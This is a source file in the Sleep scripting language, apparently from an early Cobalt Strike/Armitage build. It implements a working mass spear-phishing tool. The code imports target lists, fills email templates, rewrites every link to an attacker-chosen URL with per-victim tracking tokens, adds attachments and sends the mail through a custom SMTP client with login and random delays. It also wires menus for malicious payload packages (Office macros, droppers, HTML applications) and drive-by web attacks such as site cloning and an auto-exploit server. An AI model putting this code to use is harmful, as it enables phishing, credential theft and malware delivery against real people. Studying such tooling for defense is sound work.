#
# Cloud Strike Spear Phishing
#

import java.awt.*;
import java.awt.event.*;
import javax.net.ssl.*;

import mail.Eater;

import javax.swing.*;
import javax.swing.event.*;

import msf.*;
import ui.*;

sub cloudstrike_attack_menus {
	local('$m');

	$m = menu($1, "Packages", 'P');
		#item($m, "Adobe PDF", 'A', { createPdf(); });
		item($m, "HTML Application", 'H', { createHTMLApp() });
		item($m, "Java Application", 'J', { createJar(); });
		#item($m, ".LNK File", 'L', { createLnkFile(); });
		#item($m, "MacOS X Trojan", 'M', { createMacApp(); });
		item($m, "MS Office Macro", 'W', { createWordMacro(); });
		item($m, "Payload Generator", 'P', { createShellcode(); }); 
		item($m, "USB/CD AutoPlay", 'U', { createAutoRun(); });
		item($m, "Windows Dropper", 'D', { createDropper(); });
		item($m, "Windows Executable", 'X', { createExe(); });
		item($m, "Windows Executable (S)", 'B', { createBeaconExe(); });

	$m = menu($1, "Web Drive-by", 'W');
		item($m, "Manage", 'M', { manageSites(); });
		separator($m);
		item($m, "Auto-Exploit Server", 'x', { startCrimeKit(); });
		item($m, "Client-side Attacks", 'E', { manageClientSides(); });
		item($m, "Clone Site", 'C', { cloneURLDialog(); });
		item($m, "Firefox Add-on Attack", 'F', { createFirefoxAddon(); });
		item($m, "Host File", 'H', { createFileDownload(); });
		item($m, "PowerShell Web Delivery", 'P', { createPowerShell(); });
		item($m, "Signed Applet Attack", 'S', { createSignedApplet(); });
		item($m, "Smart Applet Attack", 'A', { createSmartApplet(); });
		item($m, "System Profiler", 'P', { startProfiler(); });

	item($1, "Spear Phish", 'S', { createPhishAttack(); });
}

# all the user file chooser + links with a table. Pass $table and $model as named parameters.
sub ui:file_import {
	local('$label $text $button $f'); 
	($label, $text, $button) = invoke(&ui:file, @_);

	$f = lambda({
		local('$file');
		$file = [$text getText];

		[$model clear: 128];
		if (-exists $file && !-isDir $file && -canread $file) {
			local('$handle $entry $to $to_name $from $from_name');
			$handle = openf($file);
			while $entry (readln($handle)) {
				$entry = ["$entry" trim];
				if ($entry ne "") {
					($to, $to_name) = split('(,\s+)|(\t+)', $entry);
					[$model addEntry: %(To => $to, To_Name => $to_name)];
				}
			}
			closef($handle);
		}

		[$model fireListeners];
	}, \$table, \$model, \$text);

	[[$text getDocument] addDocumentListener: $f];
	[$f];

	return @($label, $text, $button);
}

sub updateMessage {
	local('$message $key $value $url');
	$url = strrep($3, '%TOKEN%', $4);
	
	$message = $1;
	foreach $key => $value ($2) {
		$message = strrep($message, "% $+ $key $+ %", $value);
	}

	# replace all links in the message with the specified URL... heh.
	if ($3 ne "") {
		$message = strrep($message, "%URL%", $url);
		$message = replace($message, '(?is:(href=)["\'].*?["\'])', '$1"' . $url . '"');
	}

	return $message;
}

sub showPreview {
	local('$dialog $text $button $pain $tab $block');

	# ok, open the dialog...
	$dialog = dialog("Preview", 640, 480);
	[$dialog setLayout: [new BorderLayout]];

	#
	$pain = [new JTabbedPane];

	# RAW
	$text = [new console.Display: $preferences];
	[$text setFont: [Font decode: [$preferences getProperty: "console.font.font", "Monospaced BOLD 14"]]];
	[$text setForeground: [Color decode: [$preferences getProperty: "console.foreground.color", "#ffffff"]]];
	[$text setBackground: [Color decode: [$preferences getProperty: "console.background.color", "#000000"]]];
	[[$text console] setText: strrep($1['raw'], "\r\n", "\n")]; # because this is a separate thread...
	[$pain addTab: "Raw", $text];

	# HTML Bitches
	$block = [new ATextField];
	$text = [new JEditorPane];
        [$text setContentType: "text/html"];
	[ui.CobaltUtils workAroundEditorBug: $text];

	fork({
	        [$text setText: $html];
	}, \$text, $html => $1['html']);

        [$text setEditable: 0];
        [$text setOpaque: 1];
        [$text setCaretPosition: 0];
        [$text setBorder: [BorderFactory createEmptyBorder: 3, 3, 3, 3]];

	$tab = [new JPanel];
	[$tab setLayout: [new BorderLayout]];
	[$tab add: [new JScrollPane: $text], [BorderLayout CENTER]];
	[$tab add: $block, [BorderLayout SOUTH]];
	[$pain addTab: "HTML", $tab];

	[$text addHyperlinkListener: lambda({
		if ([$1 getEventType] eq "ENTERED") {
			[$block setText: [$1 getURL]];
			[$block setCaretPosition: 0];
		}
		else if ([$1 getEventType] eq "EXITED") {
			[$block setText: ""];
		}
		else if ([$1 getEventType] eq "ACTIVATED") {
			fork({
				dispatchEvent(lambda({
					[JOptionPane showInputDialog: $dialog, "You clicked", $url];
				}, \$url, \$dialog));
			}, $url => [$1 getURL], \$dialog);
		}
	}, \$block, \$dialog)];

	# TEXT Bitches
	$text = [new JEditorPane];
        [$text setContentType: "text/plain"];
        [$text setText: $1['text']];
        [$text setEditable: 0];
        [$text setOpaque: 1];
        [$text setCaretPosition: 0];
        [$text setBorder: [BorderFactory createEmptyBorder: 3, 3, 3, 3]];
	[$pain addTab: "Text", [new JScrollPane: $text]];

	$button = [new JButton: "Close"];
	[$button addActionListener: lambda({ [$dialog setVisible: 0]; }, \$dialog)];

	[$dialog add: $pain, [BorderLayout CENTER]];
	[$dialog add: center($button), [BorderLayout SOUTH]];
	[$dialog show];	
	[$dialog setVisible: 1];	
}

sub showMessagePreview {
	[lambda({	
		local('$data');

		call_async_callback($mclient, "cloudstrike.preview_phish", $this, %options);
		yield;
		$data = convertAll($1);

		if ('error' in $data) {
			showError($data['error']);
		}
		else {
			showPreview($data);
		}
	}, %options => $1)];
}

sub api_preview_phish {
	local('$template $attachment $target $to $tname $message %options $html $plain $parser');
	%options = convertAll($2[0]);

	if (%options['Template'] eq "" || !-exists %options['Template']) {
		return %(error => "I need a template to show you a preview!");
	}
	else if (size(%options['TargetData']) == 0) {
		return %(error => "I need a target to show you a preview!");
	}

	try {
		# process the message
		$template = [new Eater: %options['Template']];
	}
	catch $exception {
		return %(error => "Trouble processing " . %options['Template'] . ":\n" . [$exception getMessage]);
	}

	# setup our attachment (if there is one)
	$attachment = %options['Attachment'];
	if ($attachment ne "" && -exists $attachment) {
		[$template attachFile: $attachment];
	}

	$target = rand(%options['TargetData']);
	($to, $tname) = values($target, @('To', 'To_Name'));
	$message = [$template getMessage: $null, iff($tname ne "", "$tname < $+ $to $+ >", $to)];
	$message = updateMessage($message, $target, %options['URL'], '1234567890ab');
	# ^-- replace happens here... and this is what happens when we send email too

	# use a different parser instance, we don't want to do a double-replace to update our message again.
	$parser  = [new Eater: [new java.io.ByteArrayInputStream: cast($message, 'b')]];
	$html    = [$parser getMessageEntity: "text/html"];
	$plain   = [$parser getMessageEntity: "text/plain"];

	[$template done];
	[$parser done];

	return %(raw => $message, html => $html, text => $plain);
}

sub phish_log {
	local('$to $to_name $status $server $time $token $template $subject $url $attachment');
	($to, $to_name, $server, $status, $time, $token, $template, $subject, $url, $attachment) = @_;
	data_add_async('cloudstrike.sent_mail', %(to => $to, to_name => $to_name, server => $server, status => $status, time => $time, token => $token, template => $template, subject => $subject, url => $url, attachment => $attachment));
}

sub setupPhishStyle {
        this('$style');
        if ($style is $null) {
                local('$handle');
                $handle = [SleepUtils getIOHandle: resource("resources/sendemail.style"), $null];
                $style = join("\n", readAll($handle));
                closef($handle);
        }
        [$1 setStyle: $style];
}

sub sendMassEmail {
	local('$console');
	$console = [new console.Console: $preferences];
	setupPhishStyle($console);
	logCheck($console, "all", "sendemail");
	[$console updatePrompt: ""];
	[lambda({
		local('$token $cc');
		call_async_callback($mclient, "cloudstrike.go_phish", $this, %options);
		yield;
		$token = convertAll($1)['buffer'];
		$cc = [new armitage.ConsoleClient: $console, $aclient, "cloudstrike.buffer_read", $null, "cloudstrike.buffer_release", $token, $null];
		[$frame addTab: "send email", $console, $cc];
	}, %options => $1, \$console)];
}

sub api_go_phish {
	local('%options $token $buffer');
	# setup our output buffer that the user will read from...
	$token   = "phish" . ticks();
	$buffer  = [new armitage.ArmitageBuffer: 512];
	%buffers[$token] = $buffer;

	# go phishing...
	fork({
		local('$exception $attachment $victims $subject $success $y $to $tname $token %options $handle $status $template $target $message');
		%options = convertAll($options);

		# post our welcome message...
		[$buffer put: "[*] Starting mass email on " . formatDate('yyyy-MM-dd HH:mm:ss Z') . "\n"];

		# setup our spear phishing template using the Mail Eater API
		try {
			$template = [new Eater: %options['Template']];
		}
		catch $exception {
			[$buffer put: "[-] Template trouble " . %options['Template'] . ":\n" . [$exception getMessage] . "\n"];
			return;
		}
		$subject  = [$template getSubject];

		# state the options we're using...
		[$buffer put: "\nPhishing Options:\n=================\n\n"];
		[$buffer put: "   Option       Current Setting\n"];
		[$buffer put: "   ------       ---------------\n"];

		# some useful information...
		local('$victims');
		$victims  = size(%options['TargetData']);
		$victims .= iff($victims == 1, " target", " targets");
		$success = 0;

		# setup our attachment (if there is one)
		$attachment = %options['Attachment'];
		if ($attachment ne "" && -exists $attachment) {
			[$template attachFile: $attachment];
			[$buffer put: "   Attachment   $attachment $+ \n"];
		}

		# print some info...
		[$buffer put: "   Bounce To    " . %options['Bounce'] . "\n"];
		[$buffer put: "   Server       " . %options['Server'] . "\n"];
		[$buffer put: "   Subject      $subject\n"];
		[$buffer put: "   Targets      $victims $+ \n"];
		[$buffer put: "   Template     " . %options['Template'] . "\n"];

		[$buffer put: "\n"];

		# send message to each target...
		foreach $target (%options['TargetData']) {
			($to, $tname) = values($target, @('To', 'To_Name'));
			$token = substr(lc(unpack("H*", digest($to . rand(), "MD5"))[0]), 0, 12);

			try {
				[$buffer put: "[*] Send Email: $to $+ \n"];

				$message = [$template getMessage: $null, iff($tname ne "", "$tname < $+ $to $+ >", $to)];
				$message = updateMessage($message, $target, %options['URL'], $token);

				$status = send_email(%options['Server'], %options['Bounce'], $to, $message, $buffer);
				[$buffer put: "\t $+ $status $+ \n"];

				if (["$status" startsWith: "SUCCESS"]) {
					phish_log($to, $tname, %options['Server'], $status, ticks(), $token, %options['Template'], $subject, %options['URL'], $attachment);
				}
			}
			catch $exception {
				[$buffer put: "\tFailed: " . [$exception getMessage] . "\n"];
			}
			[$buffer setPrompt: " "];
		}

		call_async($client, "db.log_event", %options['Server'] . "//smtp", "sent email \" $+ $subject $+ \" to $victims");

		[$buffer put: "[*] Email sent on " . formatDate('yyyy-MM-dd HH:mm:ss Z') . "\n"];

		# release resources...
		[$template done];
	}, $options => $2[0], \$buffer, \$client, \$mclient);
	
	return %(buffer => $token);
}

inline sanityCheckParameters {
	if (size(%o['TargetData']) == 0) { 
		showError("Please import a target file");
		return;
	}
	else if (%o['Template'] eq "") {
		showError("Please choose a template message");
		return;
	}
	else if (%o['Bounce'] eq "") {
		showError("Please provide a bounce address");
		return;
	}

	# make sure the template exists...
	if (!-exists %o['Template']) {
		showError("The template does not exist");
		return;
	}
	
	# now, upload our attachment (if there is one)
	if (%o['Attachment'] ne "") {
		if (!-exists %o['Attachment']) {
			showError("Hey, the attachment doesn't exist");
			return;
		}

		[$dialog setVisible: 0];

		uploadBigFile(%o['Attachment'], $this);
		yield;
		%o['Attachment'] = $1;
	}
	else {
		[$dialog setVisible: 0];
	}

	# upload our template please!
	uploadBigFile(%o['Template'], $this);
	yield;
	%o['Template'] = $1;
}

sub setupMailServer {
	local('$dialog $panel %options @functions $button $u $p $l $a $d');
	$a = $2;

	# parse the current value
	if ($a ismatch '(.*?):(.*?)@(.*)') {
		($u, $p, $a) = matched();
		%options['USERNAME'] = $u;
		%options['PASSWORD'] = $p;
	}

	# parse the delay option
	if ($a ismatch '(.*?),(\d+)') {
		($a, $d) = matched();
		%options['Delay'] = $d;
	}
	else {
		%options['Delay'] = '0';
	}

	# are we ssl or not?
	if (["$a" endsWith: "-ssl"]) {
		%options['SSL'] = 1;
		$a = substr($a, 0, -4);
	}

	if ($a ismatch '(.*?):(.*)') {
		($l, $p) = matched();
		%options['LHOST'] = $l;
		%options['LPORT'] = $p;
	}
	else {
		%options['LHOST'] = $a;
		%options['LPORT'] = '25';
	}

	$dialog = dialog("Mail Server", 320, 240);
	$panel = [new JPanel];
	matrixLayout($panel, @(
		ui:text("SMTP Host:",    "LHOST",    @functions, %options),
		ui:text("SMTP Port:",    "LPORT",    @functions, %options),
		ui:text("Username:",     "USERNAME", @functions, %options),
		ui:text("Password:",     "PASSWORD", @functions, %options),
		ui:text("Random Delay:", "Delay",    @functions, %options)
	), 3);

	$button = ui:action("Set", @functions, %options, $dialog, lambda({
		local('$result');

		if ($1['USERNAME'] ne "" && $1['PASSWORD'] ne "") {
			$result = $1['USERNAME'] . ':' . $1['PASSWORD'] . '@';
		}

		$result .= $1['LHOST'] . ':' . $1['LPORT'];

		if ($1['SSL']) {
			$result .= '-ssl';
		}

		if (-isnumber $1['Delay'] && $1['Delay'] > 0) {
			$result .= ',' . $1['Delay'];
		}

		[$callback: $result];
	}, $callback => $1));

	[$dialog add: $panel, [BorderLayout CENTER]];
	[$dialog add: stack( ui:checkbox("Use SSL to connect to server", "SSL", @functions, %options), center($button)), [BorderLayout SOUTH]];
	[$dialog pack];
	[$dialog setVisible: 1];
	[$dialog toFront];
}

sub tableFunction {
	return lambda({
		$1['TargetData'] = convertAll([$model getRows]);
	}, $table => $1, $model => $2);
}

sub createPhishAttack {
	local('$panel $dialog');
	
	$dialog = dialog("Spear Phish", 640, 480);
	$panel = [new JPanel];
	[$panel setLayout: [new BorderLayout]];

	# users table...
	local('$table $model $scroll');
	($table, $model) = setupTable("To", @("To", "To_Name"), @());

	$scroll = [new JScrollPane: $table];
	[$scroll setPreferredSize: [new Dimension: [$scroll getWidth], 150]];

	# setup the dialog...
	local('@functions %options $middle');
	push(@functions, tableFunction($table, $model));

	%options['Bounce']   = [$preferences getProperty: "cloudstrike.send_email_bounce.string", ""];
	%options['Server']   = [$preferences getProperty: "cloudstrike.send_email_server.string", ""];
	%options['Targets']  = [$preferences getProperty: "cloudstrike.send_email_target.file", ""];

	$middle = [new JPanel];
	matrixLayout($middle, @(
		ui:file_import("Targets:"   , "Targets",    @functions, %options, 0,     30, \$table, \$model),
		ui:file("Template:"   ,       "Template",   @functions, %options, $null, 30),
		ui:file("Attachment:" ,       "Attachment", @functions, %options, $null, 30),
		ui:site("Embed URL:"  ,       "URL",        @functions, %options, $null, 30),
		ui:mailserver("Mail Server:", "Server",     @functions, %options, $null, 30),
		ui:text("Bounce To:"  ,       "Bounce",     @functions, %options, $null, 30),
	), 3);

	# setup the buttons
	local('$test $send $help $preview');

	$preview = ui:action_noclose("Preview", @functions, %options, $dialog, lambda({
		[lambda({
			# we don't want to use the attachment in a preview
			%o['Attachment'] = $null;

			# everything else is fair game though...
			sanityCheckParameters();
			[$dialog setVisible: 1];
			showMessagePreview(%o);
		}, %o => $1, $e => $2, \$dialog)];
	}, \$dialog));

	$send = ui:action_noclose("Send", @functions, %options, $dialog, lambda({
		[lambda({
			sanityCheckParameters();
			[$preferences setProperty: "cloudstrike.send_email_target.file",   %o['Targets'] . ""];
			[$preferences setProperty: "cloudstrike.send_email_bounce.string", %o['Bounce'] . ""];
			[$preferences setProperty: "cloudstrike.send_email_server.string", %o['Server'] . ""];
			savePreferences();

			if (isShift($e)) {
				[$dialog setVisible: 1];
			}

			sendMassEmail(%o);
		}, %o => $1, $e => $2, \$dialog)];
	}, \$dialog));

	$help = [new JButton: "Help"];
	[$help addActionListener: gotoURL("http://www.advancedpentest.com/help-spear-phish")];

	# now, setup the dialog and display it...
	local('$bottom');

	$bottom  = [new JPanel];
	[$bottom setLayout: [new BorderLayout]];

	[$panel add: $scroll, [BorderLayout CENTER]];
	[$panel add: $bottom, [BorderLayout SOUTH]];

	[$bottom add: $middle, [BorderLayout CENTER]];
	[$bottom add: center($preview, $send, $help), [BorderLayout SOUTH]];

	[$dialog add: $panel];
	[$dialog pack];
	[$dialog show];
}

inline checkSmtpError {
	if ("2??*" !iswm $r && "3??*" !iswm $r) {
		closef($handle);
		return "Failed: $r";
	}
}

sub readLoop {
	return [SleepUtils getScalar: [ssl.SecureSocket readbytes: [$1 getReader]]];
}

sub send_email {
	local('$a $b $c $d $e');
	($a, $b, $c, $d, $e) = @_;
	try {
		# host:port, bounce address, to address, message
		local('$handle $f $host $port $domain $status $r $exception $user $pass $auth $sock $delay');
			
		# extract username and password (if there is one)
		if ($a ismatch '(.*?):(.*?)@(.*)') {
			# get the host/port info
			($user, $pass, $a) = matched();
			$auth = 1;
		}

		# parse the delay option
		if ($a ismatch '(.*?),(\d+)') {
			($a, $delay) = matched();
			for ($delay = rand($delay) + 1; $delay > 0; $delay--) {
				[$e setPrompt: "[ $+ Delay $delay $+ s]"];
				sleep(1000);
			}
		}

		# get the host/port info
		($host, $port) = split(':', $a);
		if ($port eq "") {
			$port = '25';
		}

		# $from, $domain
		$domain = split('@', $b)[1];
		[$e setPrompt: "[ $+ Connecting to $host $+ : $+ $port $+ ]"];

		if (["$port" endsWith: "-ssl"]) {
			$handle = [[new ssl.SecureSocket: $host, int(substr($port, 0, -4)), { return 1; }] client];
		}
		else {
			$handle = connect($host, $port);
		}
		[$e setPrompt: "[Connected to $host $+ : $+ $port $+ ]"];
		$r = readLoop($handle, $e);
		checkSmtpError();

		writeb($handle, "EHLO $domain $+ \r\n");
		[$e setPrompt: "EHLO $domain"];
		$r = readLoop($handle, $e);
		checkSmtpError();
		if ($auth) {
			if ("STARTTLS" isin $r && "AUTH" !isin $r) {
				# do some TLS magic
				writeb($handle, "STARTTLS\r\n");
				[$e setPrompt: "[STARTTLS]"];
				$r = readLoop($handle, $e);
				checkSmtpError();

				# covert our socket to an SSL socket
				$sock = [new ssl.SecureSocket: [$handle getSource]];
				$handle = [$sock client];

				# start all over again?
				writeb($handle, "EHLO $domain $+ \r\n");
				[$e setPrompt: "[EHLO $domain $+ ]"];
				$r = readLoop($handle, $e);
				checkSmtpError();
			}

			# we want to authenticate bishes...
			writeb($handle, "AUTH LOGIN\r\n");
			[$e setPrompt: "[AUTH LOGIN]"];
			$r = readLoop($handle, $e);
			checkSmtpError();

			# send our username...
			writeb($handle, [msf.Base64 encode: "$user"] . "\r\n");
			$r = readLoop($handle, $e);
			checkSmtpError();

			# send our password
			writeb($handle, [msf.Base64 encode: "$pass"] . "\r\n");
			$r = readLoop($handle, $e);
			checkSmtpError();

			[$e setPrompt: "[I am authenticated...]"];
		}

		writeb($handle, "MAIL FROM: < $+ $b $+ >\r\n");
		[$e setPrompt: "[MAIL FROM: < $+ $b $+ >]"];
		$r = readLoop($handle, $e);
		checkSmtpError();

		writeb($handle, "RCPT TO: < $+ $c $+ > $+ \r\n");
		[$e setPrompt: "[RCPT TO: < $+ $c $+ >]"];
		$r = readLoop($handle, $e);
		checkSmtpError();

		writeb($handle, "DATA\r\n");
		[$e setPrompt: "[DATA]"];
		$r = readLoop($handle, $e);
		checkSmtpError();

		writeb($handle, $d);
		writeb($handle, "\r\n.\r\n");
		[$e setPrompt: "[Message Transmitted]"];
		$r = readLoop($handle, $e);
		checkSmtpError();
		closef($handle);
		return "SUCCESS: $r";
	}
	catch $exception {
		return "Failed: $exception";
	}
}
